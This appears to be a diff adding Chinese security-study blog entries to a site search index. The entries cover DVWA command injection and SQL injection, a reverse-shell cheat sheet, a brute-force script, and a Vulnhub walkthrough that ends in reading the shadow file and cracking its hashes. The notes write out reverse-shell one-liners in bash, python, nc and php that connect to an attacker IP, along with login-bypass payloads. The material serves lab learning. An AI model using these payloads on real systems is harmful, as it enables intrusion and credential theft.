rel="noopener">如何使用sudo 提权</a><br><img src="dc22.png" srcset="/img/loading.gif" alt><br><img src="dc24.png" srcset="/img/loading.gif" alt></p><p><img src="dc23.png" srcset="/img/loading.gif" alt></p><h2 id="Wpscan-安装"><a href="#Wpscan-安装" class="headerlink" title="Wpscan 安装"></a>Wpscan 安装</h2><p>因为parrot和kali自带的使用时候需要更新，但是怎么弄都更新不了，这就很烦，于是找到<a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">GitHub</a>上的README</p><p>有 docker 那肯定是使用docker安装一波</p><p>如何使用docker 请看之前docker笔记。</p><p>这里有个使用中的问题，如果你使用文本爆破的时候不管怎么写目录都会找不到，是因为文件不在docker里面，所以使用的时候需要将本地文件映射到docker里面去。使用如下所示<br><img src="1.png" srcset="/img/loading.gif" alt></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>linux</tag>
+      
+      <tag>web渗透</tag>
+      
+      <tag>靶机</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>web渗透基础二</title>
+    <link href="undefined2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
+    <url>2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
+    
+    <content type="html"><![CDATA[<blockquote><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围），而当我们输入有单引号时会自动加入\进行转义而变为\’（在PHP配置文件中magic_quotes_gpc=On的情况下或者使用addslashes函数，icov函数，mysql_real_escape_string函数、mysql_escape_string函数等，提交的参数中如果带有单引号’，就会被自动转义\’，使得多数注入攻击无效），由于宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，将后面的一个字节与前一个大于128的ascii码进行组合成为一个完整的字符（mysql判断一个字符是不是汉字，首先两个字符时一个汉字，另外根据gbk编码，第一个字节ascii码大于128，基本上就可以了），此时’前的\就被吃了，我们就可以使用’了，利用这个特性从而可实施SQL注入的利用。</p></blockquote>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>宽字节注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>web渗透基础三</title>
+    <link href="undefined2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/"/>
+    <url>2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/</url>
+    
+    <content type="html"><![CDATA[<h2 id="命令执行以及反弹shell姿势"><a href="#命令执行以及反弹shell姿势" class="headerlink" title="命令执行以及反弹shell姿势"></a>命令执行以及反弹shell姿势</h2><p>还是DVWA靶机的Command Injection</p><p>功能是在本地使用shell_exec执行ping命令</p><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {     // Get input     $target = $_REQUEST[ &#39;ip&#39; ];     // Determine OS and execute the ping command.     if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {         // Windows         $cmd = shell_exec( &#39;ping  &#39; . $target );     }     else {         // *nix         $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    }     // Feedback for the end user     echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; </code></pre><p>输入没有任何过滤，直接执行输入，这里要了解下<strong>命令链接符</strong><a href="https://www.cnblogs.com/Monarch-T/p/10388582.html" target="_blank" rel="noopener">参考</a></p><blockquote><p>&amp;&amp; :前一个指令执行成功，后面的指令才继续执行，就像进行与操作一样</p><p>|| :前一个命令执行失败，后面的才继续执行，类似于或操作</p><p>&amp; ：直接连接多个命令</p><p>| ：管道符，将前一个命令的输出作为下一个命令的输入</p><p>; ：直接连接多个命令</p></blockquote><p>我们尝试如下输入</p><p><code>127.0.0.1;ls</code></p><p>确实执行了我们的ls命令</p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>这里只贴添加的代码</p><pre><code>  $substitutions = array(         &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,         &#39;;&#39;  =&gt; &#39;&#39;,     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</code></pre><p>添加了特定字符过滤，但是没过滤完整，也还是可以执行命令</p><p>如下命令都是可以执行的</p><pre><code>127.0.0.1&amp;ls127.0.0.A|ls127.0.0.A||ls</code></pre><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><pre><code> $substitutions = array(         &#39;&amp;&#39;  =&gt; &#39;&#39;,         &#39;;&#39;  =&gt; &#39;&#39;,         &#39;| &#39; =&gt; &#39;&#39;,  # | 后面多了个空格，导致|没被过滤        &#39;-&#39;  =&gt; &#39;&#39;,         &#39;$&#39;  =&gt; &#39;&#39;,         &#39;(&#39;  =&gt; &#39;&#39;,         &#39;)&#39;  =&gt; &#39;&#39;,         &#39;`&#39;  =&gt; &#39;&#39;,         &#39;||&#39; =&gt; &#39;&#39;,     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</code></pre><p>漏洞见注释</p><p>可以使用<code>127.0.0.A|ls</code>命令执行</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>这里我也记录一下反弹shell<br><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">参考</a></p><h3 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a>linux文件描述符</h3><p>linux文件描述符：linux shell下有三种标准的文件描述符，分别如下：</p><ul><li>0 - stdin 代表标准输入,使用&lt;或&lt;&lt;</li><li>1 - stdout 代表标准输出,使用&gt;或&gt;&gt;</li><li>2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</li></ul><p>还有就是&gt;&amp;这个符号的含义，最好的理解是这样的：</p><ul><li>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</li><li>当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</li></ul><h3 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>开始之前都在本机开启一个监听，<code>nc -lnvp 8848</code></p><p><strong>注意：如果是对外网进行渗透，建议使用自己的服务器接收shell。否者可能会因为网关的nat导致连不上</strong></p><h4 id="linux机制版本"><a href="#linux机制版本" class="headerlink" title="linux机制版本"></a>linux机制版本</h4><p><code>bash -i &gt;&amp; /dev/tcp/192.168.0.5/8848 0&gt;&amp;1</code></p><h4 id="python-版本"><a href="#python-版本" class="headerlink" title="python 版本"></a>python 版本</h4><p><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.0.5&#39;,8848));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></p><h4 id="nc-版本"><a href="#nc-版本" class="headerlink" title="nc 版本"></a>nc 版本</h4><p>需要被攻击机安装nc，一般其他shell都不行可以试试这个，最后搏一搏。</p><p><code>nc -e /bin/bash 192.168.0.5 8848</code></p><h4 id="php-版本"><a href="#php-版本" class="headerlink" title="php 版本"></a>php 版本</h4><p><code>php- &#39;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.5/8848&quot;)&#39;</code></p><p><code>php -r &#39;$sock=fsockopen(&quot;192.168.0.5&quot;,8848);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p>这里的3是代表之前创建的sock的文件描述符。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>DVWA</tag>
+      
+      <tag>php</tag>
+      
+      <tag>linux</tag>
+      
+      <tag>反弹shell</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>web渗透基础一</title>
+    <link href="undefined2019/06/10/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
+    <url>2019/06/10/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9/</url>
+    
+    <content type="html"><![CDATA[<p>这之后都会是巩固的笔记，把以前留下的坑填一下。</p><h2 id="DVWA-Brute-Force"><a href="#DVWA-Brute-Force" class="headerlink" title="DVWA Brute Force"></a>DVWA Brute Force</h2><p>通过这个靶机来温习下sql注入的一下要点和防御。</p><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>源码</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) {     // Get username     $user = $_GET[ &#39;username&#39; ];     // Get password     $pass = $_GET[ &#39;password&#39; ];     $pass = md5( $pass );     // Check the database     $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;     $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );     if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) {         // Get users details         $avatar = mysql_result( $result, 0, &quot;avatar&quot; );         // Login successful         echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;         echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;;     }     else {         // Login failed         echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;     }     mysql_close(); } ?&gt; </code></pre><p>没有任何的防御，可以直接爆破，也是可以直接注入的。<br>这楼里不介绍如何爆破了，bp还是很简单易懂的，主要是这里的注入。</p><p>因为没有任何防御，直接构造<br><code>( $result &amp;&amp; mysql_num_rows( $result ) == 1 )</code><br>根据这个判断，只要查询结果不为空，而且为一行记录就可以登陆</p><p>所以以下构造都是可以的</p><pre><code>admin&#39; #&#39; union select 1,2,3,4,5,6,7,8#&#39; or 1=1 limit 1,1#</code></pre><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>源码</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );     // Sanitise username input     $user = $_GET[ &#39;username&#39; ];     $user = stripslashes( $user );     $user = mysql_real_escape_string( $user );     // Sanitise password input     $pass = $_GET[ &#39;password&#39; ];     $pass = stripslashes( $pass );     $pass = mysql_real_escape_string( $pass );     $pass = md5( $pass );     // Check database     $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;     $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );     if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) {         // Get users details         $avatar = mysql_result( $result, 0, &quot;avatar&quot; );         // Login successful         echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;         echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;;     }     else {         // Login failed         sleep( rand( 0, 3 ) );         echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;     }     mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; </code></pre><p>黑盒测试的时候发现单引号是被过滤了，所以常规注入肯定时候不存在的，但是我暴力破解了也还是可以的，没有防御，这里也不记录。</p><p>因为存在mysql_real_escape_string()函数，注入的关键符号被过滤了，但是依然要记得要小心宽字节注入。</p><p>待补</p><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );     // Sanitise username input     $user = $_GET[ &#39;username&#39; ];     $user = stripslashes( $user );     $user = mysql_real_escape_string( $user );     // Sanitise password input     $pass = $_GET[ &#39;password&#39; ];     $pass = stripslashes( $pass );     $pass = mysql_real_escape_string( $pass );     $pass = md5( $pass );     // Check database     $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;     $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );     if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) {         // Get users details         $avatar = mysql_result( $result, 0, &quot;avatar&quot; );         // Login successful         echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;         echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;;     }     else {         // Login failed         sleep( rand( 0, 3 ) );         echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;     }     mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; </code></pre><p>高阶这里为每个页面都加入了不同的token值，确实能防止一定的爆破，但是也是能够通过bp和自写脚本解决，bp爆破可以<a href="https://blog.csdn.net/he_and/article/details/80063315" target="_blank" rel="noopener">参考这</a></p><pre><code>#! /usr/bin/env/python#-*-coding:utf-8-*-import requestsfrom lxml import etree #字典nameFile=[&#39;root&#39;,]passFile = [    &#39;administrator&#39;,    &#39;admin&#39;,    &#39;password&#39;,    &#39;passwd&#39;,    &#39;123456&#39;,    &#39;123&#39;]url = &quot;&quot;&quot;http://localhost/dvwa/vulnerabilities/brute/?username={0}&amp;password={1}&amp;Login=Login&amp;user_token={2}#&quot;&quot;&quot;cookies = { #这里填写自己的cookie值注意是python的字典类型    &#39;security&#39;:&#39;high&#39;,    &#39;PHPSESSID&#39;:&#39;XXXXXXXXXXXXXXXXXXXXX&#39;,    &#39;mask&#39;:&#39;123&#39;}headers = {    &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&#39;,}def attack(payloads,url):    #先要获得user_token    source = &#39;http://localhost/dvwa/vulnerabilities/brute/index.php#&#39;    index = 0    web_data = requests.get(source,headers = headers,cookies=cookies)#请求必须带上cookie，因为dvwa需要登陆    web_data_text = web_data.text().decode(&#39;utf-8&#39;)        user_token = web_data_text.xpath(&quot;//input[@name=&#39;user_token&#39;]/@value&quot;)    #从字典枚举    for payload1 in nameFile:        for payload2 in passFile:            target = url.format(payload1,payload2,user_token)            print u&#39;当前请求：&#39;+target            web_data_text = web_data.text().decode(&#39;utf-8&#39;)                user_token = web_data_text.xpath(&quot;//input[@name=&#39;user_token&#39;]/@value&quot;)            feature = soup.find(&#39;pre&#39;)            try:                if feature.get_text()==&#39;Username and/or password incorrect.&#39;:#错误的密码或者用户名就会页面会出现此语句，这也是我们需要检索的                    print u&#39;错误&#39;            except:                print u&#39;可能得到结果：&#39;                print &#39;username:&#39;+payload1+&#39;\n&#39;+&#39;password:&#39;+payload2                exit(u&#39;结束&#39;)if __name__ == &#39;__main__&#39;:    attack(payloads,url)</code></pre><p>推荐使用弱口令(Parrot的弱口令目录在/usr/share/wordlists/rockyou.txt)</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>DVWA</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>silky：0x02靶机总结</title>
+    <link href="undefined2019/06/03/silky%EF%BC%9A0x02%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/"/>
+    <url>2019/06/03/silky%EF%BC%9A0x02%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/</url>
+    
+    <content type="html"><![CDATA[<h2 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h2><p>靶机来源<a href="https://www.vulnhub.com/entry/silky-ctf-0x02,307/" target="_blank" rel="noopener">vulnhub</a></p><p>下载 ova文件，VM 或 VB 都是可以直接打开的</p><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>具体可以详细可以参阅 <a href="https://www.youtube.com/watch?v=CW93-st2kCI&t=174s" target="_blank" rel="noopener">YouTube</a></p><p>我这里来记录下我的过程</p><h3 id="扫主机"><a href="#扫主机" class="headerlink" title="扫主机"></a>扫主机</h3><p><code>nmap 10.0.0.0/24</code>我的是这个网段</p><p>或者直接使用netdiscover进行主机发现，比不过比较慢</p><p><strong>我这里的靶机IP是10.0.0.141</strong></p><p>扫服务 <code>nmap -A 10.0.0.141</code> 扫出具体的端口及其服务。</p><p>发现 22 端口和 80 直接访问80 </p><p>打开看是一个登陆页面，随意点点看，有个登陆页</p><h4 id="后台路径遍历"><a href="#后台路径遍历" class="headerlink" title="后台路径遍历"></a>后台路径遍历</h4><p><code>dirb http://10.0.0.141 /var/share/wordlists/dirb/common.txt</code></p><p>没有扫出什么有用的，搞登陆页</p><h2 id="登陆页"><a href="#登陆页" class="headerlink" title="登陆页"></a>登陆页</h2><p>弱口令试试，没发现什么。hydra 爆破 http有待学习，</p><p>根据视频提示username 参数有代码执行</p><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>这里直接上一个nc的反弹shell</p><p><code>nc 10.0.0.141 8848 -t -e /bin/bash</code></p><p>攻击机这边监听</p><p><code>nc -lnvp 8848</code></p><p>界面不好看，上一个python的pty</p><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><h2 id="一个有溢出的文件"><a href="#一个有溢出的文件" class="headerlink" title="一个有溢出的文件"></a>一个有溢出的文件</h2><p>在/home/silky目录下有个cat_shad的文件，我们把它下载下来</p><p><strong><code>python -m SimpleHTTPServer 8822</code></strong><br><em>SimpleHTTPServer这个是python自带的库，注意大小写</em></p><p>下载好后，直接ida看一下，发现需要溢出覆盖参数 ‘a’* 0x40 + flag 这个flag就需要是 0x496C5962 由于是小端序所以我们的脚本要这样写</p><p>python -c “print ‘a’*0x40 +’\x62\x59\x6c\x49’”,这样的结果是我们输入的结果了</p><p>学习一下这个命令</p><p><code>./cat_shadow $(python -c &quot;print &#39;a&#39;*0x40 +&#39;\x62\x59\x6c\x49&#39;&quot;)</code></p><p>这样可以直接回显shadow文件，然后使用hashcat 爆破root 密码</p><p><code>sudo hashcat --force -w 3 -a 0 -m 1800 --remove -o linux.out linux.int /usr/share/wordlists/rockyou.txt</code></p><p>我虚拟机给的双核，10分钟就跑出来了</p><p><a href="https://blog.werner.wiki/use-hashcat-crack-all-kinds-of-hash/" target="_blank" rel="noopener">hashcat学习地址</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>linux</tag>
+      
+      <tag>web渗透</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>内存基础</title>
+    <link href="undefined2019/05/30/%E5%86%85%E5%AD%98%E5%9F%BA%E7%A1%80/"/>
+    <url>2019/05/30/%E5%86%85%E5%AD%98%E5%9F%BA%E7%A1%80/</url>
+    
+    <content type="html"><![CDATA[<p> <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="noopener">原文地址</a></p><h2 id="看点好玩的东西"><a href="#看点好玩的东西" class="headerlink" title="看点好玩的东西"></a>看点好玩的东西</h2><p>显然，并非每次应用程序崩溃都会导致漏洞利用。在许多情况下，应用程序崩溃不会导致利用…但有时它会。对于“exploitation”，我的意思是你希望应用程序做一些不打算做的事情……例如运行你自己的代码。使应用程序执行不应该执行的操作的最简单方法是控制其应用程序流（并将其重定向到其他位置）。这可以通过控制指令指针（或程序计数器）来完成，指令指针是一个CPU寄存器，它包含一个指针，指向需要执行的下一条指令所在的位置。假设应用程序使用参数调用函数。在转到函数之前，它将当前位置保存在指令指针中（因此它知道函数完成时返回的位置）。如果您可以修改此指针中的值，并将其指向内存中包含您自己的代码段的位置，那么您可以更改应用程序流并使其执行不同的操作（除了返回到原始位置）。您希望在控制流后执行的代码通常称为“shellcode”。因此，如果我们让应用程序运行我们的shellcode，我们可以将其称为有效的漏洞。在大多数情况下，此指针由术语EIP引用。该寄存器大小为4个字节。因此，如果您可以修改这4个字节，那么您拥有应用程序（以及运行应用程序的计算机）</p><h2 id="在我们开始之前-一些理论"><a href="#在我们开始之前-一些理论" class="headerlink" title="在我们开始之前 - 一些理论"></a>在我们开始之前 - 一些理论</h2><ul><li><p>代码段（处理器执行的指令.EIP跟踪下一条指令）</p></li><li><p>数据段（变量，动态缓冲区）</p></li><li><p>堆栈段（用于将数据/参数传递给函数，并用作变量的空间。栈从页面虚拟内存的最末端开始（=栈的底部）并向下扩展（到较低的地址）<br>一个PUSH在栈顶部添加了一些东西，POP将从栈中删除一个项目（4个字节）并将其放入寄存器中。</p></li></ul><p><strong>如果要直接访问堆栈内存，可以使用ESP（堆栈指针），它指向堆栈的顶部（因此是最低的内存地址）</strong></p><ul><li><p><strong>在push之后</strong>，ESP将指向较低的存储器地址（地址随着被压入栈的数据的大小而递减，在地址/指针的情况下为4个字节）。递减通常发生在项目放置到栈之前（取决于实现…如果ESP已经指向栈中的下一个空闲位置，则在将数据放入堆栈之后发生减量）</p></li><li><p><strong>在POP之后</strong>，ESP指向更高的地址（地址递增（在地址/指针的情况下增加4个字节））。从栈中删除项目后发生增量。</p></li></ul><p><strong>输入函数/子例程时，将创建栈帧。此栈帧将父进程的参数保存在一起，并用于将参数传递给子进程。可以通过栈指针（ESP）访问栈的当前位置，该函数的当前栈基值在基指针（EBP）（或帧指针）中。</strong></p><p><strong><em>CPU 常见寄存器：</em></strong></p><ul><li>EAX：累加器：用于执行计算，并用于<strong>存储函数调用的返回值</strong>。加，减，比等基本运算使用这个通用寄存器</li><li>EBX：它没有通用性，可用于存储数据。</li><li>ECX：计数器：用于迭代。ECX向下计数。</li><li>EDX：数据：这是EAX寄存器的扩展。它允许存储额外的数据以便于进行这些计算，从而允许更复杂的计算（乘法，除法）。</li><li>ESP：栈指针，总是指向当前栈的最顶地址。</li><li>EBP：栈基指针，总是指向当前函数栈的最大地址</li><li>ESI：源索引：保存输入数据的位置</li><li>EDI：目标索引：指向存储数据操作结果的位置 <em>（ESI和EDI主要用于存放存储单元在段内的偏移量）</em></li><li>EIP：指令指针，指向CPU下一步要执行的语句</li></ul><h2 id="进程内存"><a href="#进程内存" class="headerlink" title="进程内存"></a>进程内存</h2><p>当应用程序在Win32环境中启动时，将创建一个进程并分配虚拟内存。在32位进程中，地址范围为0x00000000至0xFFFFFFFF，其中0x00000000至0x7FFFFFFF分配给user，0x80000000至0xFFFFFFFF分配给kernel。Windows，使用平面内存模型，这意味着CPU可以直接/顺序/线性地寻址所有可用的内存位置，而无需使用分段/分页方案。</p><p>内核地址只能被操作系统使用。</p><p>创建进程时，将创建PEB（进程环境块）和TEB（线程环境块）。</p><p><strong>PEB包含与当前进程关联的所有用户地址参数：</strong></p><ul><li>主可执行文件的位置</li><li>指向加载程序数据的指针（可用于列出/可以加载到进程中的所有dll /模块）</li><li>指向有关堆的信息的指针</li></ul><p><strong>TEB描述了线程的状态，并包括</strong></p><ul><li>PEB在内存中的位置</li><li>它所属线程的堆栈位置</li><li>指向SEH链中第一个条目的指针</li></ul><p>进程内的每个线程都有一个TEB。</p><p>Win32进程内存映射如下所示：<br><img src="1.png" srcset="/img/loading.gif" alt="png1"></p><p>程序image / dll的文本段是只读的，因为它只包含应用程序代码。这可以防止人们修改应用程序代码。该内存段具有固定大小。数据段用于存储全局和静态程序变量。数据段用于初始化的全局变量，字符串和其他常量。数据段是可写的并且具有固定的大小。堆段用于其余的程序变量。它可以根据需要变大或变小。堆中的所有内存都由allocator（和deallocator）算法管理。这些算法保留了一个存储区域。<strong>堆将朝着高的地址增长</strong>。在dll中，代码，导入（dll使用的函数列表，来自另一个dll或应用程序）和导出（它使其他dll的应用程序可用的函数）都是代码段的一部分。</p><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>堆栈是进程内存的一部分，一个工作LIFO的数据结构（后进先出）。操作系统为每个线程（创建线程时）分配栈。当线程结束时，栈也被清除。栈的大小在创建时定义，并且不会更改。结合LIFO以及不需要复杂的管理结构/机制来管理的事实，栈非常快，但是尺寸有限。</p><p>LIFO意味着最近放置的数据（PUSH指令的结果）是第一个将再次从栈中删除的数据。（通过POP指令）。</p><p>创建栈时，栈指针指向栈顶部（=栈中的最高地址）。当信息被压入栈时，该栈指针会递减（转到较低的地址）。所以从本质上讲，栈会增长到较低的地址。</p><p>栈包含局部变量，函数调用和其他不需要存储更长时间的信息。随着更多数据被添加到栈（压入栈），栈指针递减并指向较低的地址值。</p><p>每次调用函数时，函数参数都会被压入栈，以及寄存器的保存值（EBP，EIP）。当函数返回时，EIP的保存值从堆栈中检索并放回EIP中，因此可以恢复正常的应用程序流程。让我们使用几行简单的代码来演示行为：</p><p>让我们使用几行简单的代码来演示行为：</p><pre><code>#include  void do_something(char *Buffer){     char MyVar[128];     strcpy(MyVar,Buffer);}int main (int argc, char **argv){     do_something(argv[1]);}</code></pre><p><img src="2.png" srcset="/img/loading.gif" alt="2"></p><p>这个应用程序接受一个参数（argv [1]并将参数传递给函数do_something（）。）在该函数中，参数被复制到一个最大为128个字节的局部变量中。所以…如果参数长于127个字节（一个空字节来终止字符串），缓冲区可能会溢出。</p><p>当从main（）内部调用函数“do_something（param1）”时，会发生以下情况：</p><p>将在“父”堆栈顶部创建一个新的堆栈帧。堆栈指针（ESP）指向新创建的堆栈的最高地址。这是“top of the stack”。</p><p><img src="3.png" srcset="/img/loading.gif" alt="3"></p><p>在调用do_something（）之前，指向参数的指针会被push到栈。在我们的例子中，这是一个指向argv [1]的指针。</p><p><img src="4.png" srcset="/img/loading.gif" alt="4"></p><p>MOV指令后栈：</p><p><img src="5.png" srcset="/img/loading.gif" alt="5"></p><p>然后，函数do_something被调用。会将主函数CALL指令的下一指令地址放到栈上（因此它是子函数返回的位置），然后跳转到功能代码。</p><p><img src="6.png" srcset="/img/loading.gif" alt="6"></p><p>push的结果，ESP递减4个字节，现在指向较低的地址。<br><img src="7.png" srcset="/img/loading.gif" alt="7"></p><p>（或者，如在调试器中看到的）：ESP指向0022FF5C。在这个地址，我们看到保存的EIP（返回…），然后是指向参数的指针（本例中为AAAA）。在执行CALL指令之前，该指针已保存在堆栈中。</p><p><img src="8.png" srcset="/img/loading.gif" alt="8"></p><p>接下来，被调用函数开始执行。先将将父函数栈基指针（EBP）保存到栈中，因此当函数返回时也可以恢复它。保存父函数栈基指针的指令是“push ebp”。ESP再次以4个字节递减。</p><p><img src="9.png" srcset="/img/loading.gif" alt="9"><br><img src="10.png" srcset="/img/loading.gif" alt="10"></p><p>在push ebp之后，当前栈指针（ESP）被置于EBP中。此时，ESP和EBP都指向当前栈的顶部。从那时起，栈通常由ESP（任何时候栈的顶部）和EBP（当前栈基指针）引用。这样，应用程序可以通过使用EBP的偏移量来引用变量。</p><blockquote><p>Most functions start with this sequence :  PUSH EBP, followed by MOV EBP,ESP</p></blockquote><p>因此，如果您将4个字节push到栈，ESP将减少4个字节，EBP仍将保持原样。然后，您可以使用EBP-0x4引用这4个字节。</p><p>接下来，我们可以看到如何声明/分配变量MyVar（128bytes）的栈空间。为了保存数据，在栈上分配一些空间来保存此变量中的数据…… ESP减少了多个字节。由于编译器确定的分配例程，这个字节数很可能超过128个字节。在Dev-C ++的情况下，这是0x98字节。所以你会看到SUB ESP，0x98指令。这样，这个变量就有空间可用。</p><p><img src="11.png" srcset="/img/loading.gif" alt="11"></p><p><strong>子函数汇编码：</strong></p><pre><code>00401290  /$ 55             PUSH EBP00401291  |. 89E5           MOV EBP,ESP00401293  |. 81EC 98000000  SUB ESP,9800401299  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; |0040129C  |. 894424 04      MOV DWORD PTR SS:[ESP+4],EAX             ; |004012A0  |. 8D85 78FFFFFF  LEA EAX,DWORD PTR SS:[EBP-88]            ; |004012A6  |. 890424         MOV DWORD PTR SS:[ESP],EAX               ; |004012A9  |. E8 72050000    CALL                 ; \strcpy004012AE  |. C9             LEAVE004012AF  \. C3             RETN</code></pre><p>（不要太担心代码。你可以清楚地看到函数序列（PUSH EBP和MOV EBP，ESP），你也可以看到为MyVar分配空间的位置（SUB ESP，98），你可以看到一些MOV和LEA指令（基本上设置了strcpy函数的参数……将指针放在argv [1]所在位置并使用它将数据复制到MyVar中。</p><p>如果此函数中没有strcpy（），则该函数现在将结束并“unwind”栈。基本上，它只会将ESP移回到保存EIP的位置，然后发出RET指令。在这种情况下，ret将从栈中拾取保存的EIP指针并跳转到它。（因此，它会在调用do_something（）之后返回main函数）。最后指令由LEAVE指令执行（它将恢复帧指针和EIP）。</p><blockquote><p>leave在32位汇编下相当于:<code>mov esp,ebp | pop 